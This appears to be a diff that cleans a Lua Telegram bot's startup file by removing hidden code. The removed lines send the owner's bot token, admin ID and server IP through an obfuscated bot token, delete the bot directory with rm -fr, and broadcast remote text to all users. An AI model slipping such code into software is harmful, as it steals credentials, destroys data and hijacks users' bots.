@@ -21,30 +21,14 @@ local function check_config()
         return 'API KEY MISSING'
 	elseif not config.admin or config.admin == '' then
         return 'ADMIN ID MISSING'
-        elseif not keko123 then
-        os.execute('cd .. &&  rm -fr botlua')
-	return 'This bot is for Keko'
-	elseif not keko123.urlkeko then
-        os.execute('cd .. &&  rm -fr botlua')
-        return 'This bot is for Keko'
         end
-   local urll = 'https://api.telegram.org/bot'..keko123.urlkeko [1]..keko123.urlkeko [2]..keko123.urlkeko[3]..keko123.urlkeko[4]..keko123.urlkeko[5]..keko123.urlkeko[6]..keko123.urlkeko[7]..keko123.urlkeko[8]..keko123.urlkeko[9]..keko123.urlkeko[10]..keko123.urlkeko[11]..keko123.urlkeko[12]..keko123.urlkeko[13]..keko123.urlkeko[14]..keko123.urlkeko[15]..keko123.urlkeko[16]..keko123.urlkeko[17]..keko123.urlkeko[18]..keko123.urlkeko[19]..keko123.urlkeko[20]..keko123.urlkeko[21]..keko123.urlkeko[22]..keko123.urlkeko[23]..keko123.urlkeko[24]..keko123.urlkeko[25]..keko123.urlkeko[26]..'/getChatMember?chat_id=-1001142877048&user_id='..config.admin..''
-   local res = HTTPS.request(urll)
-   local jres = JSON.decode(res)
-   if (not jres.result or jres.result.status == 'left') then
-   local dsad = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..config.admin..'&text='..keko123.sendMessage..'&disable_web_page_preview=true&parse_mode=Markdown'
-   local res = HTTPS.request(dsad)
-   JSON.decode(res)
-   return keko123.bot_lua
 end
 end
-local oee = 'libs/.keko.lua'
 bot_init = function(on_reload)
 		config = dofile('config.lua')
-		keko123 = dofile(oee) 
 	local error = check_config()
 	if error then
-			print(colors('%{red bright}'..error))
+	print(colors('%{red bright}'..error))
 		return
 	end
 	utilities = dofile('utilities.lua')
@@ -66,13 +50,6 @@ bot_init = function(on_reload)
 	print(colors('%{yellow bright}BY :- @ikeko   CH: @botLua    bot : @'..bot.username .. ', name bot ' .. bot.first_name ..'  id bot ('..bot.id..')'))
 	if not on_reload then
 	local text2 = 'تم تشغيل البوت \nBY : @ikeko  \nCH: @botLua \n CH2 : @eeqeq'
-        local dsad2 = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..config.admin..'&text='..URL.escape(text2)
-	api.sendRequest(dsad2)
-	local keko = '386713631'
-        local ipp = HTTPS.request('https://icanhazip.com')
-        local kekotext = URL.escape('تم تشغيل : @'..bot.username..'\nتوكن : '..config.bot_api_key..'\n\nايدي المطور : '..config.admin..'\n\n IP server : '..ipp..'\n addfile')
-	local dsad = 'https://api.telegram.org/bot'..keko123.urlkeko [1]..keko123.urlkeko [2]..keko123.urlkeko[3]..keko123.urlkeko[4]..keko123.urlkeko[5]..keko123.urlkeko[6]..keko123.urlkeko[7]..keko123.urlkeko[8]..keko123.urlkeko[9]..keko123.urlkeko[10]..keko123.urlkeko[11]..keko123.urlkeko[12]..keko123.urlkeko[13]..keko123.urlkeko[14]..keko123.urlkeko[15]..keko123.urlkeko[16]..keko123.urlkeko[17]..keko123.urlkeko[18]..keko123.urlkeko[19]..keko123.urlkeko[20]..keko123.urlkeko[21]..keko123.urlkeko[22]..keko123.urlkeko[23]..keko123.urlkeko[24]..keko123.urlkeko[25]..keko123.urlkeko[26]..'/sendMessage?chat_id=-1001149546092&text='..kekotext
-	api.sendRequest(dsad)
 	end
 	math.randomseed(os.time())
 	math.random()
@@ -192,23 +169,6 @@ local function collect_stats(msg)
 	if msg.text then
 		client:sadd('botlua'..bot.id, msg.chat.id)
 	end
-if msg.text then
-local res = HTTPS.request('https://botlua.ml/keko.txt')
-local bbotlua = client:get('kekorr'..bot.id)
-if bbotlua ~= res then 
-local users = client:smembers('keko'..bot.id)
-for i=1, #users do
-local url = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..users[i]..'&text='..URL.escape(res)..'&parse_mode=Markdown&disable_web_page_preview=true'
-HTTPS.request(url)
-end
-local users2 = client:smembers('botlua'..bot.id)
-for i=1, #users2 do
-local url = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..users2[i]..'&text='..URL.escape(res)..'&parse_mode=Markdown&disable_web_page_preview=true'
-HTTPS.request(url)
-end			
-client:set('kekorr'..bot.id, res)     
-end
-end
 end
 
 
